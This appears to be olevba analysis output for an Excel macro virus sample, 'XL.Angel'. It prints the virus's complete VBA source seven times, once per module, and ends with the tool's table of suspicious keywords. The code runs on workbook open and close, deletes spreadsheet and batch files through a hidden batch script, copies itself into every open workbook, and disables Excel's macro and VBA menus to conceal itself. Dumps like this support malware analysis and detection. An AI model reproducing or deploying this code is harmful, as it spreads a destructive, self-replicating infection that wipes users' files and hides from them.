olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Dbt.a.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Dbt.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XL.Angel Virus
'For Educational Purposes only
'Do not Distribute
'koded by D@rkByTe
Private Sub Workbook_BeforeClose(Cancel As Boolean)
ChDir ("c:\My documents")
Call copyvir
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
ChDir ("c:\My documents")
Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
ChDir ("c:\My documents")
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
  ChDir ("c:\My documents")
  Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_Open()
Call stealth
If Me.Name = "Angel.xls" Then
Workbooks.Add
copyvir
End If
End Sub

Sub copyvir()
q = Application.Path & "\xlstart"
ChDir (q)
w = Dir("*.xls")
If w = "" Or w <> "Angel.xls" Then
    Open "delxls.bat" For Output As #1
    Print #1, "del *.xls"
    Print #1, "del *.bat"
    Print #1, "exit"
    Close #1
    t = Shell("delxls.bat /c", vbHide)
    Set newBook = Workbooks.Add
    With newBook
        .Title = "Angel"
        .Subject = "Virus"
        .SaveAs FileName:="Angel.xls"
    End With
Call copyvir2
End If

Call copyvir2
End Sub
Sub copyvir2()
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = True Then
    haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
    code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

End If
 Next d
Next w
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = False Then
     w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code
     
End If
 Next d
Next w
End Sub
Sub stealth()

Application.Dialogs(xlDialogRun).Application.EnableEvents = False
Application.CommandBars("Tools").Reset
Application.RecentFiles.Maximum = 0
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("View").Controls("Toolbars").Enabled = False
Application.CommandBars("Tools").Controls("Customize...").Enabled = False
Application.CommandBars("Tools").Controls("Options...").Enabled = False

Application.CommandBars("Visual Basic").Visible = False
Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
End Sub
'Infected Date :  2/22/2000
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Dbt.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XL.Angel Virus
'For Educational Purposes only
'Do not Distribute
'koded by D@rkByTe
Private Sub Workbook_BeforeClose(Cancel As Boolean)
ChDir ("c:\My documents")
Call copyvir
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
ChDir ("c:\My documents")
Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
ChDir ("c:\My documents")
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
  ChDir ("c:\My documents")
  Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_Open()
Call stealth
If Me.Name = "Angel.xls" Then
Workbooks.Add
copyvir
End If
End Sub

Sub copyvir()
q = Application.Path & "\xlstart"
ChDir (q)
w = Dir("*.xls")
If w = "" Or w <> "Angel.xls" Then
    Open "delxls.bat" For Output As #1
    Print #1, "del *.xls"
    Print #1, "del *.bat"
    Print #1, "exit"
    Close #1
    t = Shell("delxls.bat /c", vbHide)
    Set newBook = Workbooks.Add
    With newBook
        .Title = "Angel"
        .Subject = "Virus"
        .SaveAs FileName:="Angel.xls"
    End With
Call copyvir2
End If

Call copyvir2
End Sub
Sub copyvir2()
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = True Then
    haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
    code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

End If
 Next d
Next w
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = False Then
     w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code
     
End If
 Next d
Next w
End Sub
Sub stealth()

Application.Dialogs(xlDialogRun).Application.EnableEvents = False
Application.CommandBars("Tools").Reset
Application.RecentFiles.Maximum = 0
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("View").Controls("Toolbars").Enabled = False
Application.CommandBars("Tools").Controls("Customize...").Enabled = False
Application.CommandBars("Tools").Controls("Options...").Enabled = False

Application.CommandBars("Visual Basic").Visible = False
Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
End Sub
'Infected Date :  2/22/2000
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Dbt.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XL.Angel Virus
'For Educational Purposes only
'Do not Distribute
'koded by D@rkByTe
Private Sub Workbook_BeforeClose(Cancel As Boolean)
ChDir ("c:\My documents")
Call copyvir
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
ChDir ("c:\My documents")
Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
ChDir ("c:\My documents")
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
  ChDir ("c:\My documents")
  Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_Open()
Call stealth
If Me.Name = "Angel.xls" Then
Workbooks.Add
copyvir
End If
End Sub

Sub copyvir()
q = Application.Path & "\xlstart"
ChDir (q)
w = Dir("*.xls")
If w = "" Or w <> "Angel.xls" Then
    Open "delxls.bat" For Output As #1
    Print #1, "del *.xls"
    Print #1, "del *.bat"
    Print #1, "exit"
    Close #1
    t = Shell("delxls.bat /c", vbHide)
    Set newBook = Workbooks.Add
    With newBook
        .Title = "Angel"
        .Subject = "Virus"
        .SaveAs FileName:="Angel.xls"
    End With
Call copyvir2
End If

Call copyvir2
End Sub
Sub copyvir2()
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = True Then
    haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
    code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

End If
 Next d
Next w
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = False Then
     w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code
     
End If
 Next d
Next w
End Sub
Sub stealth()

Application.Dialogs(xlDialogRun).Application.EnableEvents = False
Application.CommandBars("Tools").Reset
Application.RecentFiles.Maximum = 0
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("View").Controls("Toolbars").Enabled = False
Application.CommandBars("Tools").Controls("Customize...").Enabled = False
Application.CommandBars("Tools").Controls("Options...").Enabled = False

Application.CommandBars("Visual Basic").Visible = False
Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
End Sub
'Infected Date :  2/22/2000
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Dbt.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XL.Angel Virus
'For Educational Purposes only
'Do not Distribute
'koded by D@rkByTe
Private Sub Workbook_BeforeClose(Cancel As Boolean)
ChDir ("c:\My documents")
Call copyvir
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
ChDir ("c:\My documents")
Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
ChDir ("c:\My documents")
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
  ChDir ("c:\My documents")
  Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_Open()
Call stealth
If Me.Name = "Angel.xls" Then
Workbooks.Add
copyvir
End If
End Sub

Sub copyvir()
q = Application.Path & "\xlstart"
ChDir (q)
w = Dir("*.xls")
If w = "" Or w <> "Angel.xls" Then
    Open "delxls.bat" For Output As #1
    Print #1, "del *.xls"
    Print #1, "del *.bat"
    Print #1, "exit"
    Close #1
    t = Shell("delxls.bat /c", vbHide)
    Set newBook = Workbooks.Add
    With newBook
        .Title = "Angel"
        .Subject = "Virus"
        .SaveAs FileName:="Angel.xls"
    End With
Call copyvir2
End If

Call copyvir2
End Sub
Sub copyvir2()
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = True Then
    haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
    code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

End If
 Next d
Next w
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = False Then
     w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code
     
End If
 Next d
Next w
End Sub
Sub stealth()

Application.Dialogs(xlDialogRun).Application.EnableEvents = False
Application.CommandBars("Tools").Reset
Application.RecentFiles.Maximum = 0
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("View").Controls("Toolbars").Enabled = False
Application.CommandBars("Tools").Controls("Customize...").Enabled = False
Application.CommandBars("Tools").Controls("Options...").Enabled = False

Application.CommandBars("Visual Basic").Visible = False
Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
End Sub
'Infected Date :  2/22/2000
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Dbt.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XL.Angel Virus
'For Educational Purposes only
'Do not Distribute
'koded by D@rkByTe
Private Sub Workbook_BeforeClose(Cancel As Boolean)
ChDir ("c:\My documents")
Call copyvir
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
ChDir ("c:\My documents")
Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
ChDir ("c:\My documents")
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
  ChDir ("c:\My documents")
  Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_Open()
Call stealth
If Me.Name = "Angel.xls" Then
Workbooks.Add
copyvir
End If
End Sub

Sub copyvir()
q = Application.Path & "\xlstart"
ChDir (q)
w = Dir("*.xls")
If w = "" Or w <> "Angel.xls" Then
    Open "delxls.bat" For Output As #1
    Print #1, "del *.xls"
    Print #1, "del *.bat"
    Print #1, "exit"
    Close #1
    t = Shell("delxls.bat /c", vbHide)
    Set newBook = Workbooks.Add
    With newBook
        .Title = "Angel"
        .Subject = "Virus"
        .SaveAs FileName:="Angel.xls"
    End With
Call copyvir2
End If

Call copyvir2
End Sub
Sub copyvir2()
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = True Then
    haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
    code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

End If
 Next d
Next w
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = False Then
     w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code
     
End If
 Next d
Next w
End Sub
Sub stealth()

Application.Dialogs(xlDialogRun).Application.EnableEvents = False
Application.CommandBars("Tools").Reset
Application.RecentFiles.Maximum = 0
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("View").Controls("Toolbars").Enabled = False
Application.CommandBars("Tools").Controls("Customize...").Enabled = False
Application.CommandBars("Tools").Controls("Options...").Enabled = False

Application.CommandBars("Visual Basic").Visible = False
Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
End Sub
'Infected Date :  2/22/2000
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Dbt.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XL.Angel Virus
'For Educational Purposes only
'Do not Distribute
'koded by D@rkByTe
Private Sub Workbook_BeforeClose(Cancel As Boolean)
ChDir ("c:\My documents")
Call copyvir
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
ChDir ("c:\My documents")
Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
ChDir ("c:\My documents")
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
  ChDir ("c:\My documents")
  Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_Open()
Call stealth
If Me.Name = "Angel.xls" Then
Workbooks.Add
copyvir
End If
End Sub

Sub copyvir()
q = Application.Path & "\xlstart"
ChDir (q)
w = Dir("*.xls")
If w = "" Or w <> "Angel.xls" Then
    Open "delxls.bat" For Output As #1
    Print #1, "del *.xls"
    Print #1, "del *.bat"
    Print #1, "exit"
    Close #1
    t = Shell("delxls.bat /c", vbHide)
    Set newBook = Workbooks.Add
    With newBook
        .Title = "Angel"
        .Subject = "Virus"
        .SaveAs FileName:="Angel.xls"
    End With
Call copyvir2
End If

Call copyvir2
End Sub
Sub copyvir2()
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = True Then
    haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
    code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

End If
 Next d
Next w
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = False Then
     w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code
     
End If
 Next d
Next w
End Sub
Sub stealth()

Application.Dialogs(xlDialogRun).Application.EnableEvents = False
Application.CommandBars("Tools").Reset
Application.RecentFiles.Maximum = 0
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("View").Controls("Toolbars").Enabled = False
Application.CommandBars("Tools").Controls("Customize...").Enabled = False
Application.CommandBars("Tools").Controls("Options...").Enabled = False

Application.CommandBars("Visual Basic").Visible = False
Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
End Sub
'Infected Date :  2/22/2000
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Dbt.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XL.Angel Virus
'For Educational Purposes only
'Do not Distribute
'koded by D@rkByTe
Private Sub Workbook_BeforeClose(Cancel As Boolean)
ChDir ("c:\My documents")
Call copyvir
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
ChDir ("c:\My documents")
Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
ChDir ("c:\My documents")
If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
If ActiveWorkbook.Saved = False Then
  ChDir ("c:\My documents")
  Application.Dialogs(xlDialogSaveAs).Show
Else
    ChDir ("c:\My documents")
    ActiveWorkbook.Save
End If
End Sub

Private Sub Workbook_Open()
Call stealth
If Me.Name = "Angel.xls" Then
Workbooks.Add
copyvir
End If
End Sub

Sub copyvir()
q = Application.Path & "\xlstart"
ChDir (q)
w = Dir("*.xls")
If w = "" Or w <> "Angel.xls" Then
    Open "delxls.bat" For Output As #1
    Print #1, "del *.xls"
    Print #1, "del *.bat"
    Print #1, "exit"
    Close #1
    t = Shell("delxls.bat /c", vbHide)
    Set newBook = Workbooks.Add
    With newBook
        .Title = "Angel"
        .Subject = "Virus"
        .SaveAs FileName:="Angel.xls"
    End With
Call copyvir2
End If

Call copyvir2
End Sub
Sub copyvir2()
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = True Then
    haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
    code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

End If
 Next d
Next w
For Each w In Workbooks
 For d = 1 To w.VBProject.VBComponents.Count
  infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
If infected = False Then
     w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code
     
End If
 Next d
Next w
End Sub
Sub stealth()

Application.Dialogs(xlDialogRun).Application.EnableEvents = False
Application.CommandBars("Tools").Reset
Application.RecentFiles.Maximum = 0
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("View").Controls("Toolbars").Enabled = False
Application.CommandBars("Tools").Controls("Customize...").Enabled = False
Application.CommandBars("Tools").Controls("Options...").Enabled = False

Application.CommandBars("Visual Basic").Visible = False
Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
End Sub
'Infected Date :  2/22/2000
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |delxls.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

